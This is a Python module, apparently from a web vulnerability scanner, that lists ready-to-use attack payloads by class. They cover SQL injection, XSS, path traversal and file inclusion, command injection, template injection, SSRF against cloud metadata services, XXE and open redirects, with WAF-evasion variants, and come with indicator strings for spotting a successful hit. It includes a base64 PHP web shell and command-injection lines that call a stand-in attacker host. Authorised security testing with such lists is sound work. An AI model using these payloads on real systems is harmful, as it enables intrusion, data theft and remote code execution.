class Payloads:
    # --- SQL INJECTION (SQLi) ---
    SQLI = [
        # Authentication Bypass / Tautologies
        "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", 
        "admin' --", "admin' #", "admin'/*", "' or '1'='1'--", 
        '" OR "1"="1', '" OR 1=1--', '" OR 1=1#', "admin' OR '1'='1'/*",
        
        # Boolean-Based Blind
        "' AND 1=1--", "' AND 1=2--", 
        "1' AND 1=1#", "1' AND 1=2#",
        "1' AND (SELECT 1)=1--", "1' AND ASCII(SUBSTRING((SELECT @@version),1,1))>1--",
        
        # Time-Based Blind (MySQL, PostgreSQL, MSSQL, Oracle)
        "' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "' OR pg_sleep(5)--",
        "1' OR SLEEP(5)#", "1'; WAITFOR DELAY '0:0:5'--",
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "1' WAITFOR DELAY '0:0:5'--",
        "; BEGIN DBMS_LOCK.SLEEP(5); END;--",
        
        # Union-Based & Fingerprinting
        "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3,4,5--", 
        "' UNION SELECT NULL, NULL, NULL--",
        "' UNION ALL SELECT 1, @@version, 3--",
        "' UNION SELECT 1, sqlite_version(), 3--",
        
        # Error-Based
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version())))--",
        "1' AND UPDATEXML(1, CONCAT(0x5c, (SELECT version())), 1)--",
        
        # WAF / Filter Evasion Polyglots
        "/**/OR/**/1/**/=/**/1", "'/**/OR/**/'1'/**/=/**/'1",
        "1%00' OR 1=1--", "1' /*!50000UNION*/ /*!50000SELECT*/ 1--",
        "SLEEP/**/(5)", "1'||(SELECT 1 FROM DUAL WHERE 1=1)||'"
    ]
    
    # --- CROSS-SITE SCRIPTING (XSS) ---
    XSS = [
        # Standard Script Tags
        "<script>alert('XSS')</script>", "<script>alert(document.domain)</script>",
        "\"><script>alert(1)</script>", "'><script>alert(1)</script>",
        
        # Event Handlers
        "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", 
        "<body onload=alert(1)>", "<iframe/onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>", "<video src=x onerror=alert(1)>",
        "<details/open/ontoggle=alert(1)>", "<marquee onstart=alert(1)>",
        
        # Protocol Handlers
        "javascript:alert(1)", "javascript://%250Aalert(1)//", 
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:msgbox(1)",
        
        # Polyglots
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "\"`'><script>\\x3Bjavascript:alert(1)</script>",
        
        # WAF Bypass Types
        "<ScRiPt>alert(1)</sCrIpT>", "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<a href=\"\\x0Bjavascript:alert(1)\" id=\"frob\"></a>",
        "评估<script>alert(1)</script>" # Normalization bypass
    ]
    
    # --- LOCAL/REMOTE FILE INCLUSION (LFI/RFI) & PATH TRAVERSAL ---
    LFI = [
        # Basic Linux
        "../../../../etc/passwd", "../../../../../../../etc/passwd", 
        "/etc/passwd", "file:///etc/passwd",
        "/etc/shadow", "/etc/issue", "/proc/self/environ", "/proc/version",
        
        # Basic Windows
        "../../../../windows/win.ini", "..\\..\\..\\..\\windows\\win.ini", 
        "C:\\Windows\\win.ini", "file:///C:/Windows/win.ini",
        "C:\\boot.ini", "C:\\Windows\\System32\\drivers\\etc\\hosts",
        
        # Null Byte & Encoding Path Traversal
        "../../../../etc/passwd%00", "../../../../etc/passwd%00.jpg",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
        
        # Wrappers & RFI
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input", "expect://id", 
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGxEb25lJzsgPz4=",
        "http://127.0.0.1:8000/malicious.txt", "https://raw.githubusercontent.com/payload/payload.txt"
    ]
    
    # --- REMOTE CODE EXECUTION (RCE) / COMMAND INJECTION ---
    RCE = [
        # Command Injection logic
        "; id", "| id", "`id`", "$(id)", "&& id",
        "; cat /etc/passwd", "| type C:\\Windows\\win.ini",
        "& ping -c 1 127.0.0.1", "& ping -n 1 127.0.0.1",
        "| whoami", "; whoami", "`whoami`", 
        
        # Filter Bypasses
        "; i''d", "; i\\d", "; /bin/c?? /etc/passwd",
        "| w''h''o''a''m''i", "$u$(whoami)$u", 
        
        # OOB Interaction (Collaborator-like)
        "; curl http://127.0.0.1:8000/rce_ping", 
        "| wget http://127.0.0.1:8000/rce_ping",
        "& ping -c 3 attacker-server.com",
        "| nslookup rce.attacker-server.com",
        
        # Language Specific Eval
        "phpinfo()", "system('id')", "exec('id')", 
        "<%= 7*7 %>", "${7*7}", "{{7*7}}", "eval(compile('import os;os.system(\"id\")', '', 'exec'))"
    ]
    
    # --- SERVER SIDE TEMPLATE INJECTION (SSTI) ---
    SSTI = [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "${{7*7}}",
        "{{config}}", "{{self}}", 
        "{php}echo 7*7;{/php}",
        "{{'7'*7}}", "#{7*7}", "*{7*7}",
        "{{ [].class.base.subclasses() }}", # Python/Jinja2 escape
        "${T(java.lang.Runtime).getRuntime().exec('id')}", # Spring EL / Java
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
    ]
    
    # --- PROTOTYPE POLLUTION ---
    PROTO_POLLUTION = [
        "__proto__[test]=test", 
        "constructor[prototype][test]=test",
        "__proto__.test=test",
        "JSON.parse('{\"__proto__\": {\"test\": \"test\"}}')"
    ]

    # --- SERVER-SIDE REQUEST FORGERY (SSRF) ---
    SSRF = [
        "http://127.0.0.1", "http://localhost",
        "http://0.0.0.0", "http://[::1]",
        "http://127.0.0.1:80", "http://127.0.0.1:22", "http://127.0.0.1:3306",
        "http://169.254.169.254/latest/meta-data/", # AWS Cloud Metadata
        "http://169.254.169.254/metadata/instance?api-version=2017-08-01", # Azure
        "http://metadata.google.internal/computeMetadata/v1/", # GCP
        "file:///etc/passwd", "dict://127.0.0.1:11211/stat", "gopher://127.0.0.1:6379/_INFO",
        # Bypasses
        "http://2130706433", # 127.0.0.1 in decimal format
        "http://0177.0.0.1/", # Octal
        "http://0x7f000001/", # Hex
        "http://127.1", "http://127.0.1"
    ]

    # --- XML EXTERNAL ENTITY (XXE) ---
    XXE = [
        # Basic File Disclosure
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///windows/win.ini\">]><foo>&xxe;</foo>",
        # SSRF via XXE
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><root>&test;</root>",
        # Blind XXE
        "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM \"http://127.0.0.1:8000/xxe.dtd\"> %xxe;]><test></test>"
    ]
    
    # --- OPEN REDIRECT ---
    OPEN_REDIRECT = [
        "//example.com", "https://example.com",
        "////example.com", "///example.com",
        "\\/\\/example.com", "\\\\example.com",
        "http://example.com%00.victim.com", "http://victim.com@example.com",
        "/%0D%0Ahttps://example.com"
    ]

class Indicators:
    # Error strings and pattern matches
    SQLI = ["syntax error", "mysql", "warning:", "unclosed quotation mark", "SQL syntax", "ODBC Driver", "PostgreSQL query failed", "ORA-", "SQLite3::SQLException"]
    LFI = ["root:x:0:0", "[extensions]", "[fonts]", "daemon:x:", "System32", "win.ini", "bin:x:1:1", "www-data:x:"]
    RCE = ["uid=", "gid=", "ttl=", "bytes=32", "Microsoft Windows", "Linux", "GNU/Linux", "root", "www-data"]
    SSTI = ["49", "Array", "Object", "7777777", "java.lang.ProcessBuilder"]
    SSRF = ["ami-id", "instance-id", "computeMetadata", "uid=0(root)"]
    XXE = ["root:x:0:0", "[extensions]", "ami-id", "java.io.FileNotFoundException"]
